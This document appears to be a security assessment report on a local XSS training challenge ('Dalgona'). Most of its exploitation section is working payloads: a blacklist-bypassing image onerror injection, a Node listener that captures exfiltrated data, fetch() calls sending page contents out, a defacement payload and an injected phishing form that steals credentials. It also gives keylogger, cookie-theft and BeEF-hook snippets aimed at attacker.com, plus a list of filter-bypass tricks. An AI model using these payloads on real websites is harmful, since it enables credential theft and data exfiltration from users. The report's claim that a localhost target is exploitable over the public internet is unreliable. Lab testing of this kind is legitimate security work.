# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:37575
- **Assessment Date:** October 27, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application does not implement any authentication system - all endpoints are publicly accessible by design. This is an intentional characteristic of this XSS challenge application.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application does not implement any authorization system - there are no user roles, permissions, or access controls. This is an intentional characteristic of this XSS challenge application.

**Cross-Site Scripting (XSS) Vulnerabilities:**
**1 Critical XSS vulnerability successfully exploited** in the `/page` endpoint's `name` parameter. The vulnerability allows complete client-side compromise through arbitrary JavaScript execution, enabling data exfiltration, DOM manipulation, and credential phishing attacks. The application's weak blacklist (blocking only 'alert' and 'confirm') is trivially bypassed using alternative JavaScript execution methods.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (eliminating SQL injection attack surface) and uses hardcoded subprocess commands with array format execution that prevents shell injection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not contain endpoints that accept URLs or make server-side HTTP requests based on user input.

## Network Reconnaissance

**Exposed Services and Ports:**
- **Port 37575/tcp (Target Application):** Flask 1.1.4 development server running Dalgona Challenges XSS training application on Python 2.7.18 (EOL) and Werkzeug 1.0.1
- **Port 80/tcp:** Caddy HTTP server (non-target service)
- **Port 443/tcp:** SSL/HTTPS (non-target service)
- **Additional ports detected (out of scope):** 631/tcp (CUPS), 9999/tcp (Python SimpleHTTPServer), 49158/tcp (Tailscale - requires auth)

**Subdomains Discovered:**
Subfinder detected several localhost subdomains (mail.localhost, autodiscover.localhost, www.localhost) which are not accessible or relevant to the containerized target application at localhost:37575.

**Critical Security Findings from Automated Scans:**
- **End-of-Life Software Stack:** Python 2.7.18 (EOL January 2020), Flask 1.1.4 (outdated May 2020 release), PhantomJS (discontinued March 2018) - no security patches available
- **Development Server in Production:** Flask development server exposed on port 37575 (not production-grade)
- **XSS Protection Disabled:** Application explicitly sets `X-XSS-Protection: 0` header
- **No TLS/HTTPS:** All traffic transmitted over unencrypted HTTP
- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, Strict-Transport-Security, or X-Content-Type-Options headers
- **Debug Mode Indicators:** Flask debug mode potentially enabled, exposing interactive debugger

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in URL Parameter (name)

**Summary:**
- **Vulnerable location:** `http://localhost:37575/page?name=<PAYLOAD>`
- **Overview:** User input from the `name` query parameter is reflected directly into an unquoted HTML attribute context without any output encoding. The application's weak blacklist (only blocks 'alert' and 'confirm' case-insensitively) is trivially bypassed using alternative JavaScript execution methods. This allows arbitrary JavaScript execution leading to data exfiltration, DOM manipulation, and credential phishing attacks.
- **Impact:** Complete client-side compromise enabling:
  - Arbitrary JavaScript execution in victim's browser
  - Data exfiltration to attacker-controlled servers
  - DOM manipulation and page defacement
  - Credential harvesting via injected phishing forms
  - Potential for session hijacking (if cookies existed)
- **Severity:** **Critical**

**Prerequisites:**
- Target application running at `http://localhost:37575`
- No authentication required (publicly accessible)
- For credential phishing demonstration: HTTP server listening on port 8888 to capture exfiltrated data

**Exploitation Steps:**

#### 1. Basic JavaScript Execution (Proof of Concept)

Confirm arbitrary JavaScript execution using a simple payload that bypasses the blacklist:

```bash
# Visit the following URL in a browser (payload bypasses 'alert' blacklist using 'prompt')
http://localhost:37575/page?name=<img src=x onerror=prompt(1)>
```

**Expected Result:** A JavaScript prompt dialog appears with the message "1", confirming arbitrary JavaScript execution.

**Technical Details:**
- The payload `<img src=x onerror=prompt(1)>` creates an image element with an invalid source
- The `onerror` event handler executes when the image fails to load
- `prompt()` function bypasses the blacklist which only blocks `alert` and `confirm`
- The injected HTML breaks out of the unquoted attribute context and executes in the page

**Screenshot Evidence:** See `xss_vuln_01_execution_proof.png`

---

#### 2. Data Exfiltration Attack

**Setup Exfiltration Server:**

First, create a simple HTTP server to capture exfiltrated data:

```bash
# Create exfiltration listener script
cat > /tmp/exfil_server.js << 'EOF'
const http = require('http');
const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/exfil') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      console.log('\n=== EXFILTRATION DATA CAPTURED ===');
      console.log('Timestamp:', new Date().toISOString());
      console.log('\n--- Headers ---');
      console.log(JSON.stringify(req.headers, null, 2));
      console.log('\n--- Body ---');
      console.log(body);
      console.log('\n=== END OF CAPTURE ===\n');
      res.writeHead(200);
      res.end('OK');
    });
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(8888, () => {
  console.log('SERVER READY');
  console.log('Listening on port 8888');
  console.log('Endpoint: POST /exfil');
  console.log('Waiting for exfiltration data...\n');
  setTimeout(() => {
    console.log('\n--- Server timeout reached, shutting down ---');
    server.close();
  }, 60000);
});
EOF

# Run the exfiltration server in background
node /tmp/exfil_server.js &
```

**Execute Data Exfiltration:**

Visit the following URL to exfiltrate page data:

```bash
# URL-encoded payload that exfiltrates page title, URL, and DOM content
http://localhost:37575/page?name=<img src=x onerror="fetch('http://localhost:8888/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page_title:document.title,page_url:window.location.href,dom_content:document.body.innerText,timestamp:new Date().toISOString()})})">
```

**Proof of Impact:**

The exfiltration server captured the following data:

```json
{
  "page_title": "Dalgona - Circle",
  "page_url": "http://localhost:37575/page?name=%3Cimg%20src=x%20onerror=%22fetch(%27http://localhost:8888/exfil%27,{method:%27POST%27,headers:{%27Content-Type%27:%27application/json%27},body:JSON.stringify({page_title:document.title,page_url:window.location.href,dom_content:document.body.innerText,timestamp:new Date().toISOString()})})%22",
  "dom_content": "\nIncorrect value: TypeError: Attempting to change the setter of an unconfigurable property.",
  "timestamp": "2025-10-27T22:29:52.728Z"
}
```

**Impact:** Demonstrates that an attacker can exfiltrate any data accessible to JavaScript in the page context, including:
- Page metadata (title, URL, timestamp)
- DOM content (text, HTML structure)
- Potentially: localStorage data, sessionStorage, IndexedDB content
- Any sensitive data rendered in the page

---

#### 3. DOM Manipulation Attack (Page Defacement)

Execute complete DOM takeover by injecting malicious content:

```bash
# Visit this URL to replace entire page content
http://localhost:37575/page?name=<img src=x onerror="document.body.style.backgroundColor='red';document.querySelector('article').innerHTML='<h1>COMPROMISED BY XSS</h1><p>This page has been hijacked via Cross-Site Scripting</p>';fetch('http://localhost:8888/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({attack:'DOM_MANIPULATION',html_modified:true,message:'Page compromised'})})">
```

**Proof of Impact:**
- Page background changed to red
- Original content completely replaced with attacker's message: "COMPROMISED BY XSS"
- Exfiltration server confirmed the DOM manipulation:

```json
{
  "attack": "DOM_MANIPULATION",
  "html_modified": true,
  "message": "Page compromised"
}
```

**Screenshot Evidence:** See `xss_vuln_01_dom_manipulation_proof.png`

**Impact:** Demonstrates complete control over page appearance and content, enabling:
- Defacement attacks
- Social engineering (displaying fake warnings or messages)
- Redirecting users to malicious sites
- Creating convincing phishing interfaces

---

#### 4. Credential Phishing Attack

**Setup:** Ensure exfiltration server is running (see step 2 for setup instructions)

**Execute Phishing Attack:**

Visit the following URL to inject a fake login form:

```bash
# Inject convincing "Session Expired" phishing form
http://localhost:37575/page?name=<img src=x onerror="document.querySelector('article').innerHTML='<h2>Session Expired</h2><p>Please re-enter your credentials:</p><form id=phish><input type=text placeholder=Username name=user><br><input type=password placeholder=Password name=pass><br><button type=submit>Login</button></form>';document.getElementById('phish').onsubmit=function(e){e.preventDefault();fetch('http://localhost:8888/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({attack:'CREDENTIAL_PHISHING',username:this.user.value,password:this.pass.value})});prompt('Login successful!')}">
```

**Expected Result:**
1. Original page content is replaced with a fake "Session Expired" message
2. A login form appears with Username and Password fields
3. When a victim enters credentials and clicks "Login":
   - Credentials are sent to attacker's server (localhost:8888/exfil)
   - A fake "Login successful!" prompt appears to maintain the illusion

**Screenshot Evidence:**
- Phishing form: See `xss_vuln_01_phishing_form.png`
- Captured credentials: See `xss_vuln_01_credentials_captured.png`

**Proof of Impact:**

Test credentials were captured by the exfiltration server:

```json
{
  "attack": "CREDENTIAL_PHISHING",
  "username": "admin",
  "password": "SuperSecret2024!"
}
```

**Impact:** An attacker can:
- Harvest user credentials through convincing fake login forms
- Steal credentials by mimicking legitimate authentication flows
- Use stolen credentials for account takeover
- Expand access to other systems if passwords are reused

---

#### 5. Additional Attack Vectors (Not Demonstrated but Possible)

Given the complete lack of XSS defenses, the following attacks are also feasible:

**A. Keylogging:**
```javascript
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({key: e.key, target: e.target.name})
  });
});
```

**B. Session Token Theft (if cookies existed):**
```javascript
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({cookies: document.cookie})
});
```

**C. CSRF via XSS:**
```javascript
fetch('/admin/delete-user?id=123', {
  method: 'POST',
  credentials: 'include'
});
```

**D. BeEF Hook Integration:**
```javascript
var beef = document.createElement('script');
beef.src = 'http://attacker.com:3000/hook.js';
document.body.appendChild(beef);
```

---

**Notes:**

**Blacklist Bypass Techniques:**
The application only blocks 'alert' and 'confirm' (case-insensitive). Multiple bypass methods exist:

1. **Alternative Dialog Functions:** `prompt()`, `print()`
2. **Event Handlers:** `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`
3. **String Concatenation:** `window['ale'+'rt'](1)`
4. **Encoding:** `eval(atob('YWxlcnQoMSk='))`
5. **DOM Methods:** `<iframe src=javascript:prompt(1)>`

**Environment Factors Facilitating Exploitation:**
- No Content Security Policy (CSP)
- X-XSS-Protection explicitly disabled (`X-XSS-Protection: 0`)
- No authentication required (publicly accessible endpoint)
- No input validation beyond weak blacklist
- No output encoding applied to user input
- Unquoted HTML attribute context makes injection trivial

**Reproduction Reliability:** 100% - This vulnerability is completely reliable and reproduces every time.

**External Exploitability:** YES - Fully exploitable via public internet at `http://localhost:37575` without authentication.

**Complete Attack Chain:**
1. Attacker crafts malicious URL with XSS payload
2. Victim clicks link (via phishing email, forum post, etc.)
3. Payload executes in victim's browser with victim's session context
4. Attacker achieves objective (data theft, credential phishing, etc.)
5. No evidence left in server logs (client-side attack)

**Business Impact:**
- **Confidentiality:** HIGH - Sensitive data can be exfiltrated
- **Integrity:** HIGH - Page content can be modified, credentials stolen
- **Availability:** MEDIUM - Page functionality can be disrupted
- **Compliance:** Violates security best practices for web applications
- **Reputation:** HIGH - Successful attacks damage user trust
